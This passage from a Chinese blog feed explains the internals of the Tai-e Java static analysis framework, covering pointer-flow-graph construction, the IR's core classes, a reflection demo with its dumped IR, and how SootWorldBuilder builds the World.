arg);</span><br><span class="line">                    <span class="type">CSVar</span> <span class="variable">paramVar</span> <span class="operator">=</span> csManager.getCSVar(calleeCtx, param);</span><br><span class="line">                    <span class="comment">// 对于每一个参数</span></span><br><span class="line">                    <span class="comment">// 增加一条调用者参数到method参数的PFG边</span></span><br><span class="line">                    addPFGEdge(argVar, paramVar, FlowKind.PARAMETER_PASSING);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// pass results to LHS variable</span></span><br><span class="line">            <span class="type">Var</span> <span class="variable">lhs</span> <span class="operator">=</span> callSite.getResult();</span><br><span class="line">            <span class="keyword">if</span> (lhs != <span class="literal">null</span> &amp;&amp; propTypes.isAllowed(lhs)) &#123;</span><br><span class="line">                <span class="type">CSVar</span> <span class="variable">csLHS</span> <span class="operator">=</span> csManager.getCSVar(callerCtx, lhs);</span><br><span class="line">                <span class="keyword">for</span> (Var ret : callee.getIR().getReturnVars()) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (propTypes.isAllowed(ret)) &#123;</span><br><span class="line">                        <span class="type">CSVar</span> <span class="variable">csRet</span> <span class="operator">=</span> csManager.getCSVar(calleeCtx, ret);</span><br><span class="line">                        <span class="comment">// 结果和调用callsite左值关联，添加一条PFG边</span></span><br><span class="line">                        addPFGEdge(csRet, csLHS, FlowKind.RETURN);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        plugin.onNewCallEdge(edge);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-5-CompositePlugin"><a href="#4-5-CompositePlugin" class="headerlink" title="4.5 CompositePlugin"></a>4.5 CompositePlugin</h2><p>以上只是最基础的指针分析的流程，污点分析、反射分析，这些都是通过插件实现的，在pta.plugin下面</p><ul><li>exception</li><li>invokedynamic</li><li>natives</li><li>reflection</li><li>taint<br>这些以后再单独的详细分析吧。</li></ul><h1 id="0x5-参考"><a href="#0x5-参考" class="headerlink" title="0x5 参考"></a>0x5 参考</h1><ol><li><a href="https://static-analysis.cuijiacai.com/06-pta-intro/">6 指针分析-引入</a></li><li><a href="https://wxweven.win/2017/09/15/JVM-invokespecial%E5%92%8Cinvokevirtual/">通过实例一行一行分析JVM的invokespecial和invokevirtual指令</a></li><li><a href="https://cs.nju.edu.cn/yueli/papers/crad2023.pdf">Java 指针分析综述</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;了解了IR，再来了解下最常用的PTA 指针分析是如何实现的。&lt;/p&gt;
&lt;h1 id=&quot;0x01-指针分析PTA原理&quot;&gt;&lt;a href=&quot;#0x01-指针分析PTA原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 指针分析PTA原理&quot;&gt;&lt;/a&gt;0x01 指</summary>
      
    
    
    
    <category term="静态分析" scheme="http://m0d9.me/categories/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Tai-e" scheme="http://m0d9.me/tags/Tai-e/"/>
    
  </entry>
  
  <entry>
    <title>Tai-e 分析之IR</title>
    <link href="http://m0d9.me/2023/10/08/Tai-e-%E5%88%86%E6%9E%90%E4%B9%8BIR/"/>
    <id>http://m0d9.me/2023/10/08/Tai-e-%E5%88%86%E6%9E%90%E4%B9%8BIR/</id>
    <published>2023-10-08T09:38:00.000Z</published>
    <updated>2025-06-23T02:22:38.362Z</updated>
    
    <content type="html"><![CDATA[<p>两位老师在介绍Tai-e的时候，都会提到Tai-e的IR设计，会比Soot的更直观，这里具体看看Tai-e的IR设计及实现。</p><p>还是先给个老师演示Tai-e的IR例子。</p><h1 id="0x01-Tai-e-IR"><a href="#0x01-Tai-e-IR" class="headerlink" title="0x01 Tai-e IR"></a>0x01 Tai-e IR</h1><h2 id="1-1-Soot-VS-Tai-e"><a href="#1-1-Soot-VS-Tai-e" class="headerlink" title="1.1 Soot VS Tai-e"></a>1.1 Soot VS Tai-e</h2><p><img src="/images/pasted-738.png" alt="upload successful"></p><span id="more"></span><h2 id="1-2-重点结构"><a href="#1-2-重点结构" class="headerlink" title="1.2 重点结构"></a>1.2 重点结构</h2><ul><li>JClass（在pascal.taie.language.classes）表示程序中的类。每个实例包含类的各种信息，如类名、修饰符、声明的方法和字段等。</li><li>JMethod 和 JField：（在pascal.taie.language.classes）：表示程序中的类成员，即方法和字段。每个 JMethod/JField 实例都包含方法/字段的各种信息，如声明类、名称等。</li><li>ClassHierarchy（在pascal.taie.language.classes）：管理程序中的所有类。它提供了查询类层次信息的API，如方法分派、子类检查等。</li><li>Type（在pascal.taie.language.type）：表示程序中的类型。它有几个子类，如 PrimitiveType、ClassTyp 和 ArrayType，代表不同类型的 Java 类型。</li><li>TypeSystem（在pascal.taie.language.type）：提供用于检索特定类型和子类检查的API。</li><li>World（在pascal.taie）：管理整个程序的信息。通过使用它的获取器，你可以访问这些信息，例如ClassHierarchy 和TypeSystem。World 本质上是一个单例类，可以通过调用 World.get() 获得实例。</li></ul><p>这几个都很重要，是阅读Tai-e代码，了解Tai-e实现的基础。</p><h2 id="1-3-Tai-e-IR"><a href="#1-3-Tai-e-IR" class="headerlink" title="1.3 Tai-e IR"></a>1.3 Tai-e IR</h2><p>Tai-e 的IR 基于类型、3地址码、Java方法的语句（statement）和表达式（expression）。</p><p>重要的三个核心类：</p><ul><li>IR 是 Tai-e 中间表示的核心数据结构，每个 IR 实例都可以看作是特定方法主体信息（如变量、参数、语句等）的容器。您可以通过 JMethod.getIR()（只要方法不是抽象的）轻松获取方法的 IR 实例。</li><li>Stmt 表示程序中的所有语句。该接口有十几个子类，分别对应不同的语句。Stmt 保存在IR 中，可以通过 IR.getStmts() 获取。</li><li>Exp 表示程序中的所有表达式。该接口有几十个子类，分别对应各种表达式。Exp 与Stmts 关联，可以通过Stmt 的特定API 获取。</li></ul><p>详细的Expr和Stmt子类就不贴在这里了，可以直接看<a href="https://tai-e.pascal-lab.net/docs/current/reference/en/program-abstraction.html">参考【1】</a>中的原文</p><h2 id="1-4-Demo"><a href="#1-4-Demo" class="headerlink" title="1.4 Demo"></a>1.4 Demo</h2><p>看个例子，InvokeDemo.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokeDemo</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    InvokeDemo(String name)&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">echoName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;echo by echoName: &quot;</span> + <span class="built_in">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">echo</span><span class="params">(String content)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;echo by echo: &quot;</span> + content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodNmae</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">        <span class="type">InvokeDemo</span> <span class="variable">tt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokeDemo</span>(content);</span><br><span class="line">        <span class="comment">// 1. 测试污点为参数</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> tt.getClass().getMethod(<span class="string">&quot;echo&quot;</span>, String.class);</span><br><span class="line">        method.invoke(tt, content);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 测试污点为method</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> tt.getClass().getMethod(methodNmae);</span><br><span class="line">        method2.invoke(tt);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 测试类型</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tt3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokeDemo</span>(content);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method3</span> <span class="operator">=</span> tt3.getClass().getMethod(<span class="string">&quot;echo&quot;</span>, String.class);</span><br><span class="line">        method3.invoke(tt3, content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指定<code>-a ir-dumper</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar tai-e-all.jar -<span class="built_in">cp</span> ./InvokeDemoPath -pp --main-class InvokeDemo -ap -a ir-dumper</span><br></pre></td></tr></table></figure><p>Tai-e IR 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">public class InvokeDemo extends java.lang.Object &#123;</span><br><span class="line"></span><br><span class="line">    private java.lang.String name;</span><br><span class="line"></span><br><span class="line">    void &lt;init&gt;(java.lang.String r1) &#123;</span><br><span class="line">        [0@L7] invokespecial %this.&lt;java.lang.Object: void &lt;init&gt;()&gt;();</span><br><span class="line">        [1@L8] %this.&lt;InvokeDemo: java.lang.String name&gt; = r1;</span><br><span class="line">        [2@L9] return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void echoName() &#123;</span><br><span class="line">        java.io.PrintStream $r2;</span><br><span class="line">        java.lang.String $r1, $r3;</span><br><span class="line">        [0@L12] $r2 = &lt;java.lang.System: java.io.PrintStream out&gt;;</span><br><span class="line">        [1@L12] $r1 = %this.&lt;InvokeDemo: java.lang.String name&gt;;</span><br><span class="line">        [2@L12] $r3 = invokedynamic &lt;java.lang.invoke.StringConcatFactory: java.lang.invoke.CallSite makeConcatWithConstants(java.lang.invoke.MethodHandles$Lookup,java.lang.String,java.lang.invoke.MethodType,java.lang.String,java.lang.Object[])&gt; &quot;makeConcatWithConstants&quot; &lt;MethodType: java.lang.String (java.lang.String)&gt;[&quot;echo by echoName: &quot;]($r1);</span><br><span class="line">        [3@L12] invokevirtual $r2.&lt;java.io.PrintStream: void println(java.lang.String)&gt;($r3);</span><br><span class="line">        [4@L13] return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void echo(java.lang.String r0) &#123;</span><br><span class="line">        java.io.PrintStream $r1;</span><br><span class="line">        java.lang.String $r2;</span><br><span class="line">        [0@L16] $r1 = &lt;java.lang.System: java.io.PrintStream out&gt;;</span><br><span class="line">        [1@L16] $r2 = invokedynamic &lt;java.lang.invoke.StringConcatFactory: java.lang.invoke.CallSite makeConcatWithConstants(java.lang.invoke.MethodHandles$Lookup,java.lang.String,java.lang.invoke.MethodType,java.lang.String,java.lang.Object[])&gt; &quot;makeConcatWithConstants&quot; &lt;MethodType: java.lang.String (java.lang.String)&gt;[&quot;echo by echo: &quot;](r0);</span><br><span class="line">        [2@L16] invokevirtual $r1.&lt;java.io.PrintStream: void println(java.lang.String)&gt;($r2);</span><br><span class="line">        [3@L17] return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(java.lang.String[] r0) &#123;</span><br><span class="line">        java.lang.String r1, r2, %stringconst3;</span><br><span class="line">        int %intconst0, %intconst1;</span><br><span class="line">        InvokeDemo $r3;</span><br><span class="line">        java.lang.Class $r4, %classconst2, $r8;</span><br><span class="line">        java.lang.Class[] $r5, $r9;</span><br><span class="line">        java.lang.reflect.Method $r6, $r10;</span><br><span class="line">        java.lang.Object[] $r7, $r11;</span><br><span class="line">        [0@L20] %intconst0 = 0;</span><br><span class="line">        [1@L20] r1 = r0[%intconst0];</span><br><span class="line">        [2@L21] %intconst1 = 1;</span><br><span class="line">        [3@L21] r2 = r0[%intconst1];</span><br><span class="line">        [4@L22] $r3 = new InvokeDemo;</span><br><span class="line">        [5@L22] invokespecial $r3.&lt;InvokeDemo: void &lt;init&gt;(java.lang.String)&gt;(r1);</span><br><span class="line">        [6@L24] $r4 = invokevirtual $r3.&lt;java.lang.Object: java.lang.Class getClass()&gt;();</span><br><span class="line">        [7@L24] $r5 = newarray java.lang.Class[%intconst1];</span><br><span class="line">        [8@L24] %classconst2 = java.lang.String.class;</span><br><span class="line">        [9@L24] $r5[%intconst0] = %classconst2;</span><br><span class="line">        [10@L24] %stringconst3 = &quot;echo&quot;;</span><br><span class="line">        [11@L24] $r6 = invokevirtual $r4.&lt;java.lang.Class: java.lang.reflect.Method getMethod(java.lang.String,java.lang.Class[])&gt;(%stringconst3, $r5);</span><br><span class="line">        [12@L25] $r7 = newarray java.lang.Object[%intconst1];</span><br><span class="line">        [13@L25] $r7[%intconst0] = r1;</span><br><span class="line">        [14@L25] invokevirtual $r6.&lt;java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])&gt;($r3, $r7);</span><br><span class="line">        [15@L28] $r8 = invokevirtual $r3.&lt;java.lang.Object: java.lang.Class getClass()&gt;();</span><br><span class="line">        [16@L28] $r9 = newarray java.lang.Class[%intconst0];</span><br><span class="line">        [17@L28] $r10 = invokevirtual $r8.&lt;java.lang.Class: java.lang.reflect.Method getMethod(java.lang.String,java.lang.Class[])&gt;(r2, $r9);</span><br><span class="line">        [18@L29] $r11 = newarray java.lang.Object[%intconst0];</span><br><span class="line">        [19@L29] invokevirtual $r10.&lt;java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])&gt;($r3, $r11);</span><br><span class="line">        [20@L36] return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-IR的实现"><a href="#0x02-IR的实现" class="headerlink" title="0x02 IR的实现"></a>0x02 IR的实现</h1><p>虽然Tai-e 拿Soot 做对比，但是实际上Tai-e 也是在Soot 基础之上，通过Transfromer接口实现Soot IR 到Tai-e IR 转化。</p><h2 id="2-1-World"><a href="#2-1-World" class="headerlink" title="2.1 World"></a>2.1 World</h2><p>World 是个很重要的Tai-e 实现类，它存着整个分析程序的IR信息，它是一个final class，里面有很多结构，这里一一简单介绍下：</p><ul><li>World: static，通过getWorld() 获取</li><li>options: 配置</li><li>typeSystem: 类型关系</li><li>classHierarchy: 类层次结构</li><li>irBuilder: 生成IR，重点</li><li>nativeModel: </li><li>mainMethod: 指定的main方法</li><li>implicitEntries: 隐式入口，比如Thread.run(这个在CodeQL是没有的)</li></ul><h2 id="2-2-buildWorld"><a href="#2-2-buildWorld" class="headerlink" title="2.2 buildWorld"></a>2.2 buildWorld</h2><p>问题：World 是如何生成的呢？</p><p>先看下调用栈，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">build:<span class="number">197</span>, SootWorldBuilder (pascal.taie.frontend.soot)</span><br><span class="line">internalTransform:<span class="number">130</span>, SootWorldBuilder$<span class="number">1</span> (pascal.taie.frontend.soot)</span><br><span class="line">transform:<span class="number">36</span>, SceneTransformer (soot)</span><br><span class="line">apply:<span class="number">105</span>, Transform (soot)</span><br><span class="line">internalApply:<span class="number">37</span>, ScenePack (soot)</span><br><span class="line">apply:<span class="number">118</span>, Pack (soot)</span><br><span class="line">runWholeProgramPacks:<span class="number">620</span>, PackManager (soot)</span><br><span class="line">runPacksNormally:<span class="number">500</span>, PackManager (soot)</span><br><span class="line">runPacks:<span class="number">425</span>, PackManager (soot)</span><br><span class="line">run:<span class="number">266</span>, Main (soot)</span><br><span class="line">runSoot:<span class="number">256</span>, SootWorldBuilder (pascal.taie.frontend.soot)</span><br><span class="line">build:<span class="number">84</span>, SootWorldBuilder (pascal.taie.frontend.soot)</span><br><span class="line">lambda$buildWorld$<span class="number">3</span>:<span class="number">132</span>, Main (pascal.taie)</span><br><span class="line">run:-<span class="number">1</span>, Main$$Lambda$<span class="number">139</span>/<span class="number">0x0000000800dc8000</span> (pascal.taie)</span><br><span class="line">lambda$runAndCount$<span class="number">0</span>:<span class="number">112</span>, Timer (pascal.taie.util)</span><br><span class="line">get:-<span class="number">1</span>, Timer$$Lambda$<span class="number">110</span>/<span class="number">0x0000000800d2b680</span> (pascal.taie.util)</span><br><span class="line">runAndCount:<span class="number">93</span>, Timer (pascal.taie.util)</span><br><span class="line">runAndCount:<span class="number">111</span>, Timer (pascal.taie.util)</span><br><span class="line">runAndCount:<span class="number">107</span>, Timer (pascal.taie.util)</span><br><span class="line">buildWorld:<span class="number">124</span>, Main (pascal.taie)</span><br><span class="line">lambda$main$<span class="number">0</span>:<span class="number">60</span>, Main (pascal.taie)</span><br><span class="line">run:-<span class="number">1</span>, Main$$Lambda$<span class="number">109</span>/<span class="number">0x0000000800d2b228</span> (pascal.taie)</span><br><span class="line">lambda$runAndCount$<span class="number">0</span>:<span class="number">112</span>, Timer (pascal.taie.util)</span><br><span class="line">get:-<span class="number">1</span>, Timer$$Lambda$<span class="number">110</span>/<span class="number">0x0000000800d2b680</span> (pascal.taie.util)</span><br><span class="line">runAndCount:<span class="number">93</span>, Timer (pascal.taie.util)</span><br><span class="line">runAndCount:<span class="number">111</span>, Timer (pascal.taie.util)</span><br><span class="line">runAndCount:<span class="number">107</span>, Timer (pascal.taie.util)</span><br><span class="line">main:<span class="number">52</span>, Main (pascal.taie)</span><br></pre></td></tr></table></figure><h3 id="2-2-1-SootWorldBuilder-build1"><a href="#2-2-1-SootWorldBuilder-build1" class="headerlink" title="2.2.1 SootWorldBuilder#build1"></a>2.2.1 SootWorldBuilder#build1</h3><p>具体逻辑在SootWorldBuilder中:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">build</span><span class="params">(Options options, List&lt;AnalysisConfig&gt; analyses)</span> &#123;</span><br><span class="line">        initSoot(options, analyses, <span class="built_in">this</span>);</span><br><span class="line">        <span class="comment">// set arguments and run soot</span></span><br><span class="line">        List&lt;String&gt; args = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// set class path</span></span><br><span class="line">        Collections.addAll(args, <span class="string">&quot;-cp&quot;</span>, getClassPath(options));</span><br><span class="line">        <span class="comment">// set main class</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">mainClass</span> <span class="operator">=</span> options.getMainClass();</span><br><span class="line">        <span class="keyword">if</span> (mainClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            Collections.addAll(args, <span class="string">&quot;-main-class&quot;</span>, mainClass, mainClass);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// add input classes</span></span><br><span class="line">        args.addAll(getInputClasses(options));</span><br><span class="line">        runSoot(args.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里首先可以看看runSoot的实现，其实就是调用Soot进行分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">runSoot</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        soot.Main.v().run(args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SootResolver.SootClassNotFoundException e) &#123;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>整个build逻辑可以分为三部分</p><ol><li>初始化soot参数，initSoot</li><li>获取待分析的类，并组合成soot.Main 的参数</li><li>执行soot分析</li></ol><h3 id="2-2-2-initSoot"><a href="#2-2-2-initSoot" class="headerlink" title="2.2.2 initSoot"></a>2.2.2 initSoot</h3><p>那么具体的逻辑就是Soot的执行了，返回去看看Soot是怎么配置的，具体在initSoot方法中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">initSoot</span><span class="params">(Options options, List&lt;AnalysisConfig&gt; analyses,</span></span><br><span class="line"><span class="params">                             SootWorldBuilder builder)</span> &#123;</span><br><span class="line">    <span class="comment">// reset Soot</span></span><br><span class="line">    G.reset();</span><br><span class="line">    soot.options.Options.v().set_output_dir...</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">Transform</span> <span class="variable">transform</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Transform</span>(</span><br><span class="line">            <span class="string">&quot;wjtp.tai-e&quot;</span>, <span class="keyword">new</span> <span class="title class_">SceneTransformer</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">internalTransform</span><span class="params">(String phaseName, Map&lt;String, String&gt; opts)</span> &#123;</span><br><span class="line">            builder.build(options, Scene.v());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    PackManager.v()</span><br><span class="line">            .getPack(<span class="string">&quot;wjtp&quot;</span>)</span><br><span class="line">            .add(transform);</span><br></pre></td></tr></table></figure><p>重点逻辑是Soot 的Transform 接口。</p><p>在soot.Main.v().run(args) 过程中，会执行PackManager.v().runPacks()，其会调用所有的transfrom接口。</p><p>Transform中的builder 还是SootWorldBuilder，通过transfrom 接口执行build，不过这个build方法不是上面的那个了，参数不同。</p><h3 id="2-2-3-SootWorldBuilder-build2"><a href="#2-2-3-SootWorldBuilder-build2" class="headerlink" title="2.2.3 SootWorldBuilder#build2"></a>2.2.3 SootWorldBuilder#build2</h3><p>注意和上面的那个build不同。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">build</span><span class="params">(Options options, Scene scene)</span> &#123;</span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">    World.reset();</span><br><span class="line">    <span class="type">World</span> <span class="variable">world</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">World</span>();</span><br><span class="line">    World.set(world);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// options will be used during World building, thus it should be</span></span><br><span class="line">    <span class="comment">// set at first.</span></span><br><span class="line">    world.setOptions(options);</span><br><span class="line">    <span class="comment">// initialize class hierarchy</span></span><br><span class="line">    <span class="type">ClassHierarchy</span> <span class="variable">hierarchy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassHierarchyImpl</span>();</span><br><span class="line">    <span class="type">SootClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SootClassLoader</span>(</span><br><span class="line">            scene, hierarchy, options.isAllowPhantom());</span><br><span class="line">    hierarchy.setDefaultClassLoader(loader);</span><br><span class="line">    hierarchy.setBootstrapClassLoader(loader);</span><br><span class="line">    world.setClassHierarchy(hierarchy);</span><br><span class="line">    <span class="comment">// initialize type manager</span></span><br><span class="line">    <span class="type">TypeSystem</span> <span class="variable">typeSystem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypeSystemImpl</span>(hierarchy);</span><br><span class="line">    world.setTypeSystem(typeSystem);</span><br><span class="line">    <span class="comment">// initialize converter</span></span><br><span class="line">    <span class="type">Converter</span> <span class="variable">converter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Converter</span>(loader, typeSystem);</span><br><span class="line">    loader.setConverter(converter);</span><br><span class="line">    <span class="comment">// build classes in hierarchy</span></span><br><span class="line">    <span class="comment">// 注意这里，对class关系进行构建，保存在ClassHierarchy中</span></span><br><span class="line">    buildClasses(hierarchy, scene);</span><br><span class="line">    <span class="comment">// set main method</span></span><br><span class="line">    <span class="keyword">if</span> (options.getMainClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (scene.hasMainClass()) &#123;</span><br><span class="line">            world.setMainMethod(</span><br><span class="line">                    converter.convertMethod(scene.getMainMethod()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            logger.warn(<span class="string">&quot;Warning: main class &#x27;&#123;&#125;&#x27;&quot;</span> +</span><br><span class="line">                            <span class="string">&quot; does not have main(String[]) method!&quot;</span>,</span><br><span class="line">                    options.getMainClass());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        logger.warn(<span class="string">&quot;Warning: main class was not given!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// set implicit entries</span></span><br><span class="line">    world.setImplicitEntries(implicitEntries.stream()</span><br><span class="line">            .map(hierarchy::getJREMethod)</span><br><span class="line">            <span class="comment">// some implicit entries may not exist in certain 